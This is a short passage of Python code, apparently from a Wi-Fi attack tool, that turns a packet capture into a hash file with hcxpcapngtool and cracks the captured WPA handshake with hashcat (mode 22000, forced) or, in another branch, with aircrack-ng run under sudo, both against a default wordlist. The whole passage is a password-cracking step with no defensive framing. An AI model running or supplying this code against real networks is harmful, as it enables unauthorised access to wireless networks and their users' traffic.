            subprocess.run(["hcxpcapngtool", "-o", h, cap])
            subprocess.run(["hashcat", "-m", "22000", h, self.default_wordlist, "--force"])
        else:
            subprocess.run(["sudo", "aircrack-ng", "-w", self.default_wordlist, cap])
